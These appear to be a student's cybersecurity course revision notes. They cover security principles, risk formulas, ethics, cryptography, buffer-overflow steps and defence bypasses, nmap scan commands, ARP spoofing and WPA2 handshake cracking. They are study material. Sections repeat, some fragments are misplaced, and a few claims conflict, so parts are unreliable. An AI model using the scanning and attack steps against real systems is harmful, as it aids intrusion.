- **Data Sources**: Network traffic, security monitoring, OS/application logs, security alerts
- **Index Prefix**: All searches should start with `index=botsv1` for competition dataset

**Important Concepts:**
- **Source**: Location from which data is retrieved
- **Sourcetype**: Type of data being indexed

**Common Sourcetypes:**
- `WinEventLog:*` - Windows Event Logs (Application, Security, System)
- `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` - Sysmon monitoring logs
- `fgt_*` - Fortigate firewall logs
- `stream:*` - Network traffic logs split by protocol
- `suricata` - IDS alerts from Suricata

## Security Engineering, Operations, and Management

### What is Security Engineering?

**Definition (Ross Anderson):** "Security engineering is about building systems to remain dependable in the face of malice, error, or mischance."

#### Why Security Engineering is Important
**Critical Systems Examples:**
- Nuclear safety control systems
- Medical equipment
- Automatic driving cars
- ATM machines
- Aeroplane controls
- Banking systems

**Key Points:**
- Failure can lead to death, injury, or serious harm
- Pentesting discovers weaknesses, but secure design from the start is better
- **Cost principle**: Cheaper to address security issues early in development cycle

### Security Engineering Frameworks and Standards

#### Major Frameworks:
- **NIST EP-ITS (SP 800-27)**: 33 Principles (Withdrawn 2017)
- **NIST SP800-160**: 32 "Security Design Principles" (Appendix F)
- **OWASP**: "Security by Design Principles" - 10 Principles

**Note**: No de-facto list of principles = use rules of thumb

### 10 Security Principles (Modified OWASP List)

#### 1. Keep Security Simple
- More complex systems = more likely security flaws exist
- Keep controls atomic

#### 2. Make Security Usable
- **Before**: Complex certificate warnings, complicated password requirements
- **Now**: User-friendly security warnings, better UX design
- **Problem**: Overly complex security leads to workarounds (passwords on sticky notes)

#### 3. Least Privilege
- **Users**: Limit damage by limiting user rights (no local administrator)
- **Programs**: Running as non-root limits damage after compromise
- **Principle**: Grant minimum access necessary for function

#### 4. Segregation of Duties
- Reduce single party ability to perpetrate fraud
- **Two-man rule**: Nuclear launch requires two people
- **Examples**:
  - Person A: Update vendor bank account
  - Person B: Approve payment  
  - Person C: Transfer money
- **Development**: Developer cannot directly push to production

#### 5. Defence in Depth
**Multiple Security Layers:**
- System patched
- Secure coding
- Services running as non-root
- Web server in DMZ
- Firewall and IDS in place

**Key Points:**
- Prevent AND detect
- 100% prevention not possible or economical
- Use different vendors for each layer (anti-malware at network, email, workstation, file storage)

#### 6. Zero Trust
**Don't trust anything by default:**
- User inputs = validate
- Third-party libraries = security review and pentests
- Third-party contractors = background check
- Employees = background check + monitoring
- Applications = host-based firewall + monitoring

**Modern Context:**
- No perimeter (Cloud Services and BYOD)
- Microsegmentation
- Fine-grained audit and adaptive security

#### 7. Security by Default
**Examples:**
- Turn OFF all insecure services
- SELinux enabled out of the box
- No default passwords (or require change on first logon)
- Default deny rule on firewall

#### 8. Fail Securely
**Firewall Example:**
- ✅ **Correct**: Default deny with specific allow rules
- ❌ **Wrong**: Allow everything by default

**Code Example:**
```java
// Correct approach
isAdmin = false;
try {
    codeWhichMayFail();
    isAdmin = isUserInRole("Administrator");
} catch (Exception ex) {
    log.write(ex.toString());
}

// Wrong approach  
isAdmin = true;
try {
    codeWhichMayFail();
    isAdmin = isUserInRole("Administrator");
} catch (Exception ex) {
    log.write(ex.toString());
}
```

#### 9. Avoid Security by Obscurity
**Kerckhoff's Principle:**
- Protect the key, but make encryption protocol open
- Running SSH on non-standard port (2211) is OK, but don't rely on hackers NOT finding it
- Obfuscating code is not real security
- Certificate authentication on standard port is much better

#### 10. Risk-Informed
- Does it make economic sense for the attacker?
- **Don't spend $10,000 to protect a $1,000 asset**
- Balance spending on security vs. value of assets

## Information Security and Risk Management

### What is Information Security Management?

**Definition**: Protect the security of information assets (information itself + systems that process/transmit/store information) by efficiently deploying security controls that prevent/detect threats.

**Security Components:**
- **Confidentiality**: Information only accessible to authorized users
- **Integrity**: Information remains accurate and unaltered
- **Availability**: Information accessible when needed
- **Accountability**: Non-repudiation, audit trails

**Security Controls Examples**: Access control, disaster recovery, penetration testing

### Risk Management

#### What is Risk?
**Formula**: Risk = Threat + Vulnerability

**Examples:**
- Computer worm + unpatched OS = Risk of compromised host
- Laptop theft + unencrypted disk = Risk of data breach  
- Storm + underground data centre = Risk of flooded data centre

**NIST SP 800-30 Definition**: "Risk is a function of the likelihood of a given threat-source's exercising a particular potential vulnerability, and the resulting impact of that adverse event on the organisation."

#### Risk Measurement

**Qualitative Analysis:**
- Function of (IMPACT, LIKELIHOOD)
- **RISK = IMPACT × LIKELIHOOD**

**Risk Matrix Example:**
| Likelihood | Insignificant (1) | Minor (2) | Moderate (3) | Major (4) | Extreme (5) |
|------------|-------------------|-----------|--------------|-----------|-------------|
| Almost Certain (A) | M | M | H | E | E |
| Likely (B) | L | M | H | H | E |
| Possible (C) | L | M | M | H | H |
| Unlikely (D) | L | L | M | M | H |
| Rare (E) | L | L | L | L | M |

**Likelihood Definitions:**
- **A - Almost Certain**: Highly likely to happen, possibly frequently
- **B - Likely**: Will probably happen, but not persistent
- **C - Possible**: May happen occasionally
- **D - Unlikely**: Not expected to happen, but possible
- **E - Rare**: Very unlikely this will ever happen

**Risk Categories:**
- **Extreme (E)**: Immediate attention & response needed
- **High (H)**: Risk to be given appropriate attention & demonstrably managed
- **Medium (M)**: Assess risk; determine if current controls adequate
- **Low (L)**: Manage by routine procedures; monitor & review locally

#### Quantitative Risk Analysis

**Key Metrics:**
- **Asset Value (AV)**: $ value of information asset
- **Exposure Factor (EF)**: % of asset loss caused by threat
- **Single Loss Expectancy (SLE)**: AV × EF
- **Annualised Rate of Occurrence (ARO)**: Frequency per year
- **Annualised Loss Expectancy (ALE)**: SLE × ARO

**Example:**
- Research data worth $1M (AV = $1M)
- Ransomware renders 50% useless (EF = 0.5)
- SLE = $1M × 0.5 = $500K
- Attack once every two years (ARO = 0.5)
- ALE = $500K × 0.5 = $250K

#### Risk Treatment Options

**4 Choices:**
1. **Accept**: Define risk appetite of organisation
2. **Transfer**: Buy insurance, outsource
3. **Mitigate**: Implement controls
4. **Avoid**: Give up on the activity

#### Types of Controls

**By Implementation:**
- **Administrative**: Policies, guidelines
- **Physical**: Locks and walls
- **Technical**: Software design, configurations

**By Function:**
- **Preventive**: Firewalls
- **Detective**: Intrusion Detection
- **Corrective**: Incident response plan

**Control Examples Quiz:**
- HR Manager approval for HR system access: Administrative, Preventive
- Minimum password length: Technical, Preventive
- IDS: Technical, Detective
- IPS: Technical, Preventive
- Antivirus: Technical, Preventive/Detective
- Secure coding practices: Administrative, Preventive
- Security patches: Technical, Preventive
- Incident response plan: Administrative, Corrective
- Locked data centre door: Physical, Preventive
- Surveillance camera: Physical, Detective

- Latest attack techniques
- New vulnerabilities and vendor patches
- New IOCs (Indicators of Compromise)

#### 3. Threat Hunting
**Actively searching for signs of attack**
- Use intelligence data + highly skilled cybersecurity analysts
- **Key Questions**:
  - How would the bad guys attack?
  - What would we see in logs if they were attacking?
  - How would we know if system has been compromised?
  - What would we see in logs if someone is inside network?
- **Goal**: Find incidents as early as possible

#### 4. Detect
**Ear to the ground - Minimise MTTD (Mean Time To Detect)**

## Ethics in Cybersecurity

### Fundamental Concepts

#### Definition of Ethics
> "Ethics are a system of principles and rules concerning moral obligations and regard for the rights of others"
- **Simple rule for ethics:** What we are interested in here is harm minimisation.

#### Key Components
- **Moral obligations**
- **Rights of others**
- **Systematic approach**
- **Principled decision-making**

### Ethical Behavior Framework

#### Classification Matrix
**Dimensions**:
- **Harm Awareness**: Unaware ↔ Aware
- **Application Level**: Personal/Ad Hoc ↔ Systematic

**Behavior Types**:
1. **Rationalisation/Indifference** (Unaware, Personal)
2. **Dismissive** (Aware, Personal)  
3. **Mechanical** (Unaware, Systematic)
4. **Ethical Behaviour** (Aware, Systematic)

### Three Major Ethical Schools

#### 1. Consequentialism
- **Focus**: Outcomes and consequences
- **Goal**: Maximize good/minimize harm
- **Challenges**:
  - Subjective definition of "good"
  - Individual vs. collective benefit conflicts
  - Not all values are comparable or exchangeable

#### 2. Duty-Focused (Deontological)
- **Focus**: Adherence to rules and duties
- **Principle**: Some actions are inherently right/wrong
- **Application**: Universal principles regardless of outcomes

#### 3. Virtue-Focused
- **Focus**: Character and moral virtues
- **Emphasis**: What kind of person should I be?
- **Application**: Cultivating virtues like honesty, courage, justice

### Critical Ethical Questions in Cybersecurity

#### Question Framework: "Where is the harm?"

**Examples for Analysis**:

1. **System Exploration**
   - "Where is the harm in exploring a system you discovered open?"
   - **Considerations**: 
     - Unintentional knowledge disclosure (A breach of someone else's privacy)
     - Creating attack vectors for others (You are showing people the way in)
     - Modeling malicious behavior (You might go in and break something)

2. **IoT Device Activation**
   - "Where is the harm in activating all network connectivity of household devices?"
   - **Considerations**:
     - Privacy invasion (Another back door into your home network)
     - Security vulnerabilities
     - Consent and ownership

3. **Data Monetization**
   - "Where is the harm in using enrollment data to sell advertising?"
   - **Considerations**:
     - Consent and transparency
     - Data ownership rights
     - Secondary use implications
     - They might leak data about you

4. **Digital Piracy**
   - "Where is the harm in copying music without paying?"
   - **Considerations**:
     - Artist compensation
     - Industry sustainability
     - Intellectual property rights

### Reflection Framework

#### The Golden Rule Test
**Key Question**: "Is this principle one that you would like applied to you?"

**Application Process**:
1. Identify the underlying principle
2. Consider role reversal
3. Evaluate personal comfort with universal application
4. Assess fairness and reciprocity

### Professional Ethics Context

#### **Australian Computer Society (ACS) Code of Ethics**
**Number of Core Values**: **6 Values**

**The Six Values**:
1. **The Primacy of the Public Interest**
2. **The Enhancement of Quality of Life**  
3. **Honesty**
4. **Competence**
5. **Professional Development**
6. **Professionalism**

**Key Components**:
- **Professional Conduct Rules**: Detailed guidelines for behavior
- **Professional Standards**: Technical and ethical benchmarks
- **Continuing Professional Development**: Ongoing learning requirements

#### Current Industry Focus
- **Legal Compliance**: Avoiding legislation violations
- **Financial Protection**: Preventing substantial fines
- **Reputation Management**: Protecting brand value
- **Risk Mitigation**: Proactive ethical frameworks

#### GDPR as Ethics in Law
- **Principle**: Data protection and privacy rights
- **Enforcement**: Significant financial penalties
- **Global Impact**: Worldwide compliance requirements
- **Precedent**: Ethics codified into enforceable law

### Complex Ethical Scenarios

#### The Trolley Problem in Cybersecurity
**Core Issue**: "Human life is not fungible"
- **Application**: Autonomous system decisions
- **Challenge**: Quantifying incomparable values
- **Relevance**: AI decision-making in security contexts

#### Information Gathering Ethics
**When asking questions, expect three types of responses**:
1. **Perception of truth** - What they believe is accurate
2. **What they think you want to hear** - Socially desirable responses
3. **Lies** - Deliberate deception

### Practical Application

#### Decision-Making Process
1. **Identify stakeholders** and their interests
2. **Analyze potential consequences** across different timeframes
3. **Consider duty-based obligations** and universal principles
4. **Evaluate character implications** - virtue development
5. **Apply reflection test** - reciprocity and fairness
6. **Document reasoning** for accountability

#### Common Cybersecurity Ethical Dilemmas
- **White Hat vs. Gray Hat** activities
- **Disclosure timelines** for vulnerabilities
- **Penetration testing boundaries**
- **Data collection and retention**
- **Automated defense responses**
- **International law variations**

### Key Takeaways

### Data Privacy of Users
- If you don't need it, you don't store it. If you do need it, you do store it. But if you do store it, you store it securely.

#### Ethics Requires Exploration
- **Complexity**: If resolution is simple, it's not truly an ethical dilemma
- **Multiple perspectives**: Different frameworks yield different answers
- **Context dependency**: Situational factors matter significantly

#### Everything is Affected
- **Behavior patterns**
- **Stakeholder expectations** 
- **Public perception**
- **Outcome recognition and accountability**

#### Professional Responsibility
- **Continuous education** on ethical frameworks
- **Proactive consideration** of ethical implications
- **Collaborative discussion** with peers and mentors
- **Documentation** of ethical decision-making processes

# 📕 QUICK THEORY REFERENCE

## Cryptography Fundamentals

### Core Principles
- **Confidentiality**: Encryption protects data from unauthorized access
- **Integrity**: Hashing ensures data hasn't been tampered with
- **Authentication**: Digital certificates verify identity
- **Non-repudiation**: Digital signatures prevent denial of actions
- **Availability**: NOT a cryptographic goal (handled by other security measures)

### Symmetric vs Asymmetric Cryptography

#### Symmetric Cryptography
- **Challenge**: Key distribution problem - how to securely share the secret key
- **Algorithms**: AES, DES, 3DES
- **Modes**: ECB (insecure, shows patterns), CBC (secure, chains blocks)
- **Use Cases**: Bulk data encryption, fast encryption/decryption

#### Asymmetric Cryptography
- **Key Pairs**: Public key (shareable) and private key (secret)
- **Digital Signatures**: Sign with private key, verify with public key
- **Encryption**: Encrypt with public key, decrypt with private key
- **Algorithms**: RSA, ECC, DSA

### Diffie-Hellman Key Exchange
```
Parameters: a, b (private), g, p (public)
Alice computes: A = g^a mod p (sends to Bob)
Bob computes: B = g^b mod p (sends to Alice)
Shared secret: K = g^ab mod p

Man-in-the-Middle Attack:
Mallory intercepts and establishes separate keys with Alice and Bob
```

### Hash Functions and Attacks
- **Hash Collision**: Two different inputs produce same hash output
- **MD5**: Vulnerable to collisions, deprecated
- **SHA-1**: Deprecated
- **SHA-256/SHA-3**: Currently secure

### Password Security
- **Salt**: Random value added to password before hashing
- **Stretching**: Intentionally slow hashing (bcrypt, Argon2)
- **Rainbow Tables**: Pre-computed hash lookups (defeated by salt)

### Kerckhoff's Principle
Security should not depend on secrecy of the algorithm design - only the key should be secret.

## Memory Security and Buffer Overflows

### Stack Structure
```
High Memory Address
├── Command Line Arguments
├── Environment Variables
├── Stack (grows down)
│   ├── Local Variables
│   ├── Saved Registers
│   ├── Return Address  ← Target for overflow
│   └── Function Parameters
├── Heap (grows up)
├── Data Segment
└── Code Segment
Low Memory Address
```

### Buffer Overflow Attack Process
1. **Identify vulnerable function**: `gets()`, `strcpy()`, `sprintf()`
2. **Calculate offset**: Distance to return address
3. **Craft payload**: Filler + Return Address + Shellcode
4. **Execute**: Overwrite return address to point to shellcode

### Assembly Basics
- **Prologue**: Function entry (`push ebp; mov ebp, esp`)
- **Epilogue**: Function exit (`mov esp, ebp; pop ebp; ret`)
- **Stack grows downward** (higher to lower addresses)
- **EBP > ESP** in normal programs
- **Assembly instructions**:
  - `mov eax, 0x10` - Move value to register
  - `sub eax, 0x10` - Subtract from register
  - `cmp eax, 0x10` - Compare values (sets flags)

### Defense Mechanisms

#### Stack Canaries
- Random values placed before return address
- Checked on function return
- **Bypass**: Overwrite canary with correct value (if leaked)

#### ASLR (Address Space Layout Randomization)
- Randomizes memory layout of processes
- Makes it harder to predict addresses
- **Bypass**: Information leaks, brute force attacks

#### DEP/NX (Data Execution Prevention)
- Marks stack and heap as non-executable
- Prevents shellcode execution
- **Bypass**: Return-to-libc, ROP (Return-Oriented Programming)

#### PIE (Position Independent Executable)
- Randomizes base address of executable
- **Bypass**: Information disclosure vulnerabilities

### NOP Sled
- Series of No Operation instructions (`\x90`)
- Creates larger target for shellcode execution
- Allows inexact return address targeting

### Heap Spraying
- Fill heap with multiple copies of shellcode
- Increases probability of successful exploitation
- Common in browser exploits

### Return-to-libc Attack
- Reuses existing library functions instead of injecting shellcode
- Bypasses DEP/NX protections
- Can defeat stack canaries (doesn't modify return address detection)

---

## Network Security

### TCP Three-Way Handshake
```
Client → Server: SYN
Server → Client: SYN-ACK
Client → Server: ACK
```

### Scanning Techniques

#### Half-Open Scan (SYN Scan)
- Sends SYN, receives SYN-ACK, doesn't send final ACK
- **Missing**: Final ACK packet
- Stealthier than full connect scan

#### Other Scan Types
- **FIN Scan**: Lower chance of being logged
- **XMAS Scan**: Sets PSH, URG, and FIN flags
- **UDP Scan**: Slower, often filtered

### Network Attacks

#### ARP Spoofing
- Poison ARP cache to intercept traffic
- **Tools**: `arpspoof`, `ettercap`
- **Defense**: Static ARP entries, ARP inspection

#### DNS Attacks
- **DNS Spoofing**: Fake DNS responses
- **DNSSEC**: Uses digital signatures and certificate chains to prevent spoofing

#### Man-in-the-Middle (MITM)
- **ARP Cache Poisoning**: Redirect traffic through attacker
- **Tools**: `arpspoof`, `ettercap`
- Result: Attacker's MAC associated with gateway IP in victim's ARP table

### WiFi Security

#### WPA2-PSK Vulnerabilities
- **Dictionary Attacks**: Weak passwords vulnerable to offline attacks
- **4-Way Handshake Capture**: Allows offline password brute-forcing
- **Key Reinstallation (KRACK)**: 2017 vulnerability
- **Dragonblood**: 2019 WPA3 vulnerability

#### WPA2-PSK Attack Process
1. Capture 4-way handshake
2. Extract challenge/response
3. Offline brute-force attack against captured handshake

#### **WPA2-PSK Decryption Scope After PSK Discovery**

**Scenario**: Attacker records WiFi session, later discovers PSK through brute-force

**What CAN be decrypted**:
- ✅ **Recorded session data**: If handshake was captured
- ✅ **All traffic from that specific session**: Using derived PTK/GTK
- **Process**:
  1. Use discovered PSK + captured nonces (ANonce, SNonce)
  2. Derive session keys: PTK = f(PSK, ANonce, SNonce, MAC addresses)
  3. Decrypt all recorded frames using derived keys

**What CANNOT be decrypted**:
- ❌ **Future sessions without new handshake capture**: Session keys change
- ❌ **Past sessions with different nonces**: Each handshake creates unique keys
- **Reason**: Session keys (PTK/GTK) are ephemeral, derived using unique nonces per connection

**Key Insight**: PSK alone isn't enough - attacker needs BOTH the PSK AND the specific handshake (nonces) to decrypt that session's traffic.

### Amplification Attacks
- **Concept**: Small request triggers large response
- **UDP preference**: Connectionless protocol easier to spoof
- **Examples**: DNS, NTP, SMTP amplification

#### Fail Safe/Fail Securely
- System fails to secure state when mechanisms fail

#### Open Design
- Security doesn't depend on secrecy of design

#### Security by Default
- Systems secure in default configuration

#### Zero Trust
- "Never trust, always verify" - assume breach mentality

### Security Controls Types
- **Preventative**: Block attacks (firewalls, access controls)
- **Detective**: Identify attacks (IDS, logging)
- **Administrative**: Policies and procedures
- **Responsive**: React to incidents

### Team Colors
- **Red Team**: Offensive security (attackers)

## Incident Response and Risk Management

### Risk Assessment Formulas
```
ALE = SLE × ARO
Where:
- ALE = Annualized Loss Expectancy
- SLE = Single Loss Expectancy  
- ARO = Annualized Rate of Occurrence

SLE = Asset Value × Exposure Factor

Example:
Asset Value = $10,000,000
Exposure Factor = 50% (0.5)
ARO = 0.2 (once every 5 years)
SLE = $10,000,000 × 0.5 = $5,000,000
ALE = $5,000,000 × 0.2 = $1,000,000
```

### Risk Response Strategies
1. **Mitigate**: Reduce likelihood or impact
2. **Accept**: Accept the risk as-is
3. **Transfer**: Shift risk to third party (insurance)
4. **Avoid**: Eliminate the risk source

### SIEM (Security Information and Event Management)
- **Purpose**: Detect and analyze logs for threats
- **Example**: Splunk
- **Capabilities**: Log aggregation, correlation, alerting

### Indicators of Compromise (IOC)
- Login by administrative user at unusual hours
- User logging in from multiple countries simultaneously
- Multiple login failures from same IP address
- Server communicating to known C2 server

### Splunk Search Examples
```
# Find incoming HTTP traffic to specific host
index=main sourcetype="stream:http" dest_ip="10.10.10.23"

# Search for specific files
find /usr -name "rockyou*"  # Files starting with "rockyou"
```

```

### x86 Registers
- **EIP (Extended Instruction Pointer)**: Points to current instruction
- **ESP (Extended Stack Pointer)**: Points to top of stack
- **EBP (Extended Base Pointer)**: Points to base of current stack frame

### Buffer Overflow Attack Process
1. **Identify vulnerable function**: `gets()`, `strcpy()`, `sprintf()`
2. **Calculate offset**: Distance from buffer to return address
3. **Craft payload**: `[Filler] + [Return Address] + [Shellcode]`
4. **Execute**: Overwrite return address to point to shellcode

### Assembly Instructions
```assembly
mov eax, 0x10        ; Move value to register
sub eax, 0x10        ; Subtract from register
cmp eax, 0x10        ; Compare values (sets flags)
call 0x8004bc       ; Call function
ret                 ; Return from function
jmp 0x8004bc        ; Unconditional jump
```

### Defense Mechanisms

- `%n` - Write to memory location

### NOP Sled and Shellcode
- **NOP Sled**: Series of `\x90` instructions creating larger target
- **Shellcode**: Small assembly code to execute shell
- **Payload Structure**: `[NOP Sled] + [Shellcode] + [Padding] + [Return Address]`

## Cryptography Fundamentals

### Core Security Goals (CIA+)
- **Confidentiality**: Protect from unauthorized disclosure
- **Integrity**: Prevent unauthorized modification
- **Availability**: Ensure access when needed (NOT a crypto goal)
- **Authentication**: Verify identity
- **Non-repudiation**: Prevent denial of actions

### Symmetric vs Asymmetric Encryption

Public: g, p
Alice: chooses secret a, sends A = g^a mod p
Bob: chooses secret b, sends B = g^b mod p
Shared Secret: K = g^(ab) mod p
```

### Hash Functions
- **Properties**: One-way, fixed output, deterministic, avalanche effect
- **MD5**: Broken (collisions found)
- **SHA-1**: Deprecated
- **SHA-256/SHA-3**: Current standards

### Digital Signatures
```
1. Hash document: H(M)
2. Encrypt hash with private key: S = E(H(M), K_priv)
3. Verify: H(M) = D(S, K_pub)
```

### Password Security
- **Plain Storage**: Never acceptable
- **Simple Hashing**: Vulnerable to rainbow tables
- **Salted Hashing**: Random salt per password
- **Stretched Hashing**: Slow algorithms (bcrypt, Argon2)

### Kerckhoff's Principle
Security should depend only on secrecy of the key, not the algorithm.

## Network Security

### TCP Three-Way Handshake
```
Client → Server: SYN
Server → Client: SYN-ACK
Client → Server: ACK
```

### Port Scanning Techniques

#### TCP SYN Scan (Half-Open)

- **Stealthy**: Doesn't complete handshake
- **Default**: Nmap default scan

#### TCP Connect Scan
- Complete full three-way handshake
- **Logged**: Easily detected
- **Accurate**: Works through any TCP stack

#### Stealth Scans
- **FIN Scan**: Send FIN only
- **NULL Scan**: No flags set
- **XMAS Scan**: FIN+PSH+URG flags

### Nmap Common Commands
```bash
nmap -sS target           # SYN scan
nmap -sT target           # TCP connect scan
nmap -sU target           # UDP scan
nmap -O target            # OS detection
nmap -sV target           # Version detection
nmap -A target            # Aggressive (OS, version, scripts)
nmap -p 1-1000 target     # Port range
nmap -T4 target           # Timing template
```

### ARP Poisoning Attack
1. **Normal**: Host asks "Who has IP X?" → Response "MAC Y has IP X"
2. **Attack**: Attacker responds with own MAC for gateway IP
3. **Result**: Victim sends traffic to attacker instead of gateway
4. **Tools**: `arpspoof`, `ettercap`

- **Examples**: DNS, NTP amplification
- Spoofed victim IP in requests

### WiFi Security

#### WPA2-PSK Attack
1. Capture 4-way handshake
2. Offline brute-force password
3. **Tools**: `aircrack-ng`, `hashcat`

#### Attack Timeline
- **WEP**: Broken (2004)
- **WPA**: Transitional (2003)

## Security Frameworks & Management

### Risk Management Formulas
```
Risk = Threat × Vulnerability
SLE = Asset Value × Exposure Factor
ALE = SLE × ARO

Example:
Asset Value = $1,000,000
Exposure Factor = 50% (0.5)
ARO = 0.2 (once every 5 years)
SLE = $1,000,000 × 0.5 = $500,000
ALE = $500,000 × 0.2 = $100,000
```
